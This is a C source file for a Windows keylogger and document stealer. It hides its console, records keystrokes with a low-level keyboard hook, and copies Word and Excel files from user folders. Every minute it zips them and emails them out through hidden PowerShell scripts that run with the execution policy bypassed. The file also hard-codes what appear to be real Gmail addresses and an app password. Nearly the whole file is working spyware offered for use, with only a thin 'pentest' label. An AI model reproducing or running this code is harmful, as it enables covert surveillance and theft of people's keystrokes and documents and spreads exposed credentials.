#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================
// CONFIGURE YOUR GMAIL ACCOUNTS HERE
// ============================================================
#define SMTP_SERVER     "smtp.gmail.com"
#define SMTP_PORT       587
#define EMAIL_FROM      "vryllumangay@gmail.com"
#define EMAIL_TO        "skyc0279@gmail.com"
#define EMAIL_SUBJECT   "Pentest Data Collection"
#define EMAIL_USER      "vryllumangay@gmail.com"
#define EMAIL_PASS      "olqa xqxr qifs lodb"   // <-- PUT YOUR APP PASSWORD HERE
// ============================================================

#define KEY_LOG_FILE    "C:\\Windows\\Temp\\kl.dat"
#define COLLECTED_DIR   "C:\\Windows\\Temp\\collected"
#define ARCHIVE_NAME    "C:\\Windows\\Temp\\data.zip"
#define DOC_LOG_FILE    "C:\\Windows\\Temp\\doc_sent.log"
#define PS_SCRIPT_FILE  "C:\\Windows\\Temp\\send_mail.ps1"
#define DEBUG_LOG_FILE  "C:\\Windows\\Temp\\collector_debug.log"
#define KEYLOG_TEMP     "C:\\Windows\\Temp\\kl_attachment.dat"
#define MAX_PATH_LEN    260
#define BUFFER_SIZE     8192

void DebugLog(const char *fmt, ...) {
    FILE *f = fopen(DEBUG_LOG_FILE, "a");
    if (!f) return;
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    va_list args;
    va_start(args, fmt);
    vfprintf(f, fmt, args);
    va_end(args);
    fprintf(f, "\n");
    fclose(f);
}

HHOOK g_hKeyboardHook = NULL;
FILE *g_klFile = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKb->vkCode;
        if (g_klFile) {
            SYSTEMTIME st;
            GetLocalTime(&st);
            fprintf(g_klFile, "[%04d-%02d-%02d %02d:%02d:%02d] VK=%lu\n",
                    st.wYear, st.wMonth, st.wDay,
                    st.wHour, st.wMinute, st.wSecond,
                    vkCode);
            fflush(g_klFile);
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    (void)lpParam;
    DebugLog("Keylogger thread starting, opening %s", KEY_LOG_FILE);
    g_klFile = fopen(KEY_LOG_FILE, "a");
    if (!g_klFile) {
        DebugLog("FAILED to open keylog file");
        return 1;
    }

    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
                                        GetModuleHandle(NULL), 0);
    if (!g_hKeyboardHook) {
        DebugLog("FAILED to install keyboard hook (last error=%lu)", GetLastError());
        fclose(g_klFile);
        return 1;
    }

    DebugLog("Keyboard hook installed, entering message loop");
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hKeyboardHook);
    fclose(g_klFile);
    return 0;
}

int DirectoryExists(const char *path) {
    DWORD attribs = GetFileAttributesA(path);
    return (attribs != INVALID_FILE_ATTRIBUTES && (attribs & FILE_ATTRIBUTE_DIRECTORY));
}

int IsFileAlreadySent(const char *filename) {
    FILE *f = fopen(DOC_LOG_FILE, "r");
    if (!f) return 0;
    char line[MAX_PATH_LEN];
    while (fgets(line, sizeof(line), f)) {
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') line[len-1] = '\0';
        if (strcmp(line, filename) == 0) { fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

void MarkFileAsSent(const char *filename) {
    FILE *f = fopen(DOC_LOG_FILE, "a");
    if (f) { fprintf(f, "%s\n", filename); fclose(f); }
}

int CollectNewDocumentsFromDir(const char *targetDir) {
    WIN32_FIND_DATAA ffd;
    char searchPath[MAX_PATH_LEN], srcPath[MAX_PATH_LEN], dstPath[MAX_PATH_LEN];
    int newFileCount = 0;
    if (!DirectoryExists(targetDir)) {
        DebugLog("  Directory does not exist: %s", targetDir);
        return 0;
    }
    CreateDirectoryA(COLLECTED_DIR, NULL);
    const char *extensions[] = {"*.docx", "*.xlsx"};
    for (int i = 0; i < 2; i++) {
        snprintf(searchPath, sizeof(searchPath), "%s\\%s", targetDir, extensions[i]);
        HANDLE hFind = FindFirstFileA(searchPath, &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    snprintf(srcPath, sizeof(srcPath), "%s\\%s", targetDir, ffd.cFileName);
                    if (!IsFileAlreadySent(ffd.cFileName)) {
                        snprintf(dstPath, sizeof(dstPath), "%s\\%s", COLLECTED_DIR, ffd.cFileName);
                        CopyFileA(srcPath, dstPath, FALSE);
                        MarkFileAsSent(ffd.cFileName);
                        DebugLog("  Collected new doc: %s", ffd.cFileName);
                        newFileCount++;
                    }
                }
            } while (FindNextFileA(hFind, &ffd) != 0);
            FindClose(hFind);
        }
    }
    return newFileCount;
}

int CollectAllNewDocuments(void) {
    DebugLog("CollectAllNewDocuments starting");
    int total = 0;
    char userDocs[MAX_PATH_LEN];
    const char *userProfile = getenv("USERPROFILE");
    if (userProfile) {
        DebugLog("  User profile: %s", userProfile);
        snprintf(userDocs, sizeof(userDocs), "%s\\Documents", userProfile);
        total += CollectNewDocumentsFromDir(userDocs);
        char desktop[MAX_PATH_LEN];
        snprintf(desktop, sizeof(desktop), "%s\\Desktop", userProfile);
        total += CollectNewDocumentsFromDir(desktop);
    }
    total += CollectNewDocumentsFromDir("C:\\Users\\Public\\Documents");
    DebugLog("  Total new docs found: %d", total);
    return total;
}

// ==================== RUN POWERSHELL COMMAND RELIABLY ====================
int RunPowerShellScript(const char *scriptPath, const char *args) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine),
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\" %s",
        scriptPath, args ? args : "");

    DebugLog("  Launching: %s", cmdLine);

    BOOL created = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!created) {
        DebugLog("  CreateProcess FAILED (last error=%lu)", GetLastError());
        return -1;
    }

    DebugLog("  CreateProcess OK, waiting for completion...");
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000); // 60s timeout
    if (waitResult == WAIT_TIMEOUT) {
        DebugLog("  Process timed out after 60s, killing");
        TerminateProcess(pi.hProcess, 1);
    } else {
        DebugLog("  Process completed");
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    DebugLog("  Process exit code: %lu", exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)exitCode;
}

// ==================== ZIP FILES USING POWERSHELL ====================
int ZipCollectedFiles(void) {
    DebugLog("ZipCollectedFiles starting");
    if (!DirectoryExists(COLLECTED_DIR)) {
        DebugLog("  collected dir does not exist");
        return 0;
    }

    char searchPath[MAX_PATH_LEN];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", COLLECTED_DIR);
    int fileCount = 0;
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                fileCount++;
                DebugLog("  Found file to zip: %s", ffd.cFileName);
            }
        } while (FindNextFileA(hFind, &ffd) != 0);
        FindClose(hFind);
    }
    DebugLog("  Files to zip: %d", fileCount);
    if (fileCount == 0) return 0;

    DeleteFileA(ARCHIVE_NAME);

    FILE *f = fopen(PS_SCRIPT_FILE, "w");
    if (!f) {
        DebugLog("  FAILED to write zip script");
        return 0;
    }
    fprintf(f, "try {\n");
    fprintf(f, "  Add-Type -AssemblyName System.IO.Compression.FileSystem;\n");
    fprintf(f, "  [System.IO.Compression.ZipFile]::CreateFromDirectory('%s', '%s', 'Optimal', $false);\n",
            COLLECTED_DIR, ARCHIVE_NAME);
    fprintf(f, "  Write-Host 'ZIP OK';\n");
    fprintf(f, "} catch {\n");
    fprintf(f, "  Write-Host 'ZIP ERROR: ' + $_.Exception.Message;\n");
    fprintf(f, "  exit 1;\n");
    fprintf(f, "}\n");
    fclose(f);

    DebugLog("  Running zip script");
    RunPowerShellScript(PS_SCRIPT_FILE, NULL);
    DeleteFileA(PS_SCRIPT_FILE);

    FILE *zipCheck = fopen(ARCHIVE_NAME, "rb");
    if (!zipCheck) {
        DebugLog("  ZIP file not created!");
        return 0;
    }
    fseek(zipCheck, 0, SEEK_END);
    long sz = ftell(zipCheck);
    fclose(zipCheck);
    DebugLog("  ZIP file size: %ld bytes", sz);

    return (sz > 100) ? 1 : 0;
}

// ==================== EMAIL SENDING ====================

void SendEmail(void) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    DebugLog("====== SendEmail cycle start ======");

    // 1. Collect new documents
    int newDocs = CollectAllNewDocuments();

    // 2. Zip documents (if any new docs found)
    int zipCreated = 0;
    if (newDocs > 0) {
        DebugLog("New docs found, attempting to zip");
        zipCreated = ZipCollectedFiles();
    } else {
        DebugLog("No new documents to zip");
    }

    // After zipping, clean the collected dir
    if (zipCreated) {
        DebugLog("Cleaning collected dir after zip");
        char searchPath[MAX_PATH_LEN];
        snprintf(searchPath, sizeof(searchPath), "%s\\*", COLLECTED_DIR);
        WIN32_FIND_DATAA ffd;
        HANDLE hFind = FindFirstFileA(searchPath, &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char filePath[MAX_PATH_LEN];
                    snprintf(filePath, sizeof(filePath), "%s\\%s", COLLECTED_DIR, ffd.cFileName);
                    DeleteFileA(filePath);
                    DebugLog("  Deleted collected file: %s", ffd.cFileName);
                }
            } while (FindNextFileA(hFind, &ffd) != 0);
            FindClose(hFind);
        }
    }

    // Check keylog file
    int hasKeylogData = 0;
    long klSize = 0;
    FILE *klCheck = fopen(KEY_LOG_FILE, "rb");
    if (klCheck) {
        fseek(klCheck, 0, SEEK_END);
        klSize = ftell(klCheck);
        DebugLog("Keylog file size: %ld bytes", klSize);
        if (klSize > 15) hasKeylogData = 1;
        fclose(klCheck);
    } else {
        DebugLog("Keylog file does NOT exist at %s", KEY_LOG_FILE);
    }

    // Check zip file
    int hasZip = 0;
    FILE *zipCheck = fopen(ARCHIVE_NAME, "rb");
    if (zipCheck) {
        fseek(zipCheck, 0, SEEK_END);
        long zipSz = ftell(zipCheck);
        DebugLog("Zip file size: %ld bytes", zipSz);
        if (zipSz > 100) hasZip = 1;
        fclose(zipCheck);
    } else {
        DebugLog("Zip file does NOT exist");
    }

    if (!hasKeylogData && !hasZip) {
        DebugLog("NO DATA to send (keylog=%d, zip=%d), skipping email", hasKeylogData, hasZip);
        return;
    }
    DebugLog("HAS DATA (keylog=%d, zip=%d) - proceeding to send", hasKeylogData, hasZip);

    // Use a temp copy of keylog for attachment since the keylogger
    // thread has kl.dat open for writing - PS script can't open it directly
    char klAttachPath[MAX_PATH_LEN] = KEYLOG_TEMP;
    DeleteFileA(KEYLOG_TEMP);
    if (CopyFileA(KEY_LOG_FILE, KEYLOG_TEMP, FALSE)) {
        DebugLog("Copied keylog to %s for attachment", KEYLOG_TEMP);
    } else {
        DebugLog("CopyFileA failed (err=%lu), attaching original kl.dat", GetLastError());
        strncpy(klAttachPath, KEY_LOG_FILE, MAX_PATH_LEN - 1);
        klAttachPath[MAX_PATH_LEN - 1] = '\0';
    }

    // 3. Write the PowerShell email script
    FILE *f = fopen(PS_SCRIPT_FILE, "w");
    if (!f) {
        DebugLog("FAILED to write email PS script");
        return;
    }

    fprintf(f, "# Auto-generated email script\n");
    fprintf(f, "$ErrorActionPreference = 'Stop';\n");
    fprintf(f, "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n");
    fprintf(f, "\n");
    fprintf(f, "$att1 = $null;\n");
    fprintf(f, "$att2 = $null;\n");
    fprintf(f, "$msg = $null;\n");
    fprintf(f, "try {\n");
    fprintf(f, "  $smtp = New-Object Net.Mail.SmtpClient('%s', %d);\n", SMTP_SERVER, SMTP_PORT);
    fprintf(f, "  $smtp.EnableSsl = $true;\n");
    fprintf(f, "  $smtp.Credentials = New-Object System.Net.NetworkCredential('%s', '%s');\n", EMAIL_USER, EMAIL_PASS);
    fprintf(f, "  $msg = New-Object Net.Mail.MailMessage('%s', '%s', '%s', 'Attached: keylog.txt + collected documents');\n", EMAIL_FROM, EMAIL_TO, EMAIL_SUBJECT);
    fprintf(f, "\n");
    fprintf(f, "  if (Test-Path '%s') {\n", klAttachPath);
    fprintf(f, "    $att1 = New-Object Net.Mail.Attachment('%s');\n", klAttachPath);
    fprintf(f, "    $att1.Name = 'keylog.txt';\n");
    fprintf(f, "    $msg.Attachments.Add($att1);\n");
    fprintf(f, "  }\n");
    fprintf(f, "  if (Test-Path '%s') {\n", ARCHIVE_NAME);
    fprintf(f, "    $att2 = New-Object Net.Mail.Attachment('%s');\n", ARCHIVE_NAME);
    fprintf(f, "    $msg.Attachments.Add($att2);\n");
    fprintf(f, "  }\n");
    fprintf(f, "\n");
    fprintf(f, "  $smtp.Send($msg);\n");
    fprintf(f, "} catch {\n");
    fprintf(f, "  $_ | Out-File -FilePath 'C:\\Windows\\Temp\\email_error.txt' -Append;\n");
    fprintf(f, "  Write-Host 'EMAIL ERROR: ' + $_.Exception.Message;\n");
    fprintf(f, "  exit 1;\n");
    fprintf(f, "} finally {\n");
    fprintf(f, "  if ($att1) { $att1.Dispose(); }\n");
    fprintf(f, "  if ($att2) { $att2.Dispose(); }\n");
    fprintf(f, "  if ($msg) { $msg.Dispose(); }\n");
    fprintf(f, "}\n");
    fclose(f);

    DebugLog("Email PS script written to %s", PS_SCRIPT_FILE);

    // 4. Run the script and wait for it
    DebugLog("Running email PS script...");
    int psResult = RunPowerShellScript(PS_SCRIPT_FILE, NULL);
    DebugLog("Email PS script returned: %d", psResult);

    // 5. Clean up
    if (psResult == 0) {
        DebugLog("Email sent successfully, cleaning up");
        DeleteFileA(ARCHIVE_NAME);
        DeleteFileA(PS_SCRIPT_FILE);

        // Clear keylog on success
        FILE *clearKl = fopen(KEY_LOG_FILE, "w");
        if (clearKl) {
            fprintf(clearKl, "=== Keylog started at %04d-%02d-%02d %02d:%02d:%02d ===\n",
                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            fclose(clearKl);
            DebugLog("Keylog file cleared");
        }
    } else {
        DebugLog("Email failed - PS_SCRIPT left at %s for inspection", PS_SCRIPT_FILE);
        // Keep the files around for debugging
    }
}

// ==================== MAIN ====================
int main(void) {
    // Hide console
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    // Clear debug log
    FILE *clearLog = fopen(DEBUG_LOG_FILE, "w");
    if (clearLog) fclose(clearLog);

    DebugLog("=== COLLECTOR STARTED ===");

    HANDLE hKL = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    if (!hKL) {
        DebugLog("FAILED to create keylogger thread (last error=%lu)", GetLastError());
        return 1;
    }
    DebugLog("Keylogger thread created");

    int cycle = 0;
    while (1) {
        DebugLog("Sleeping for 60 seconds (cycle %d)", cycle);
        Sleep(60000); // 1 minute for faster testing
        DebugLog("--- SendEmail cycle %d ---", cycle);
        SendEmail();
        cycle++;
    }

    WaitForSingleObject(hKL, INFINITE);
    return 0;
}
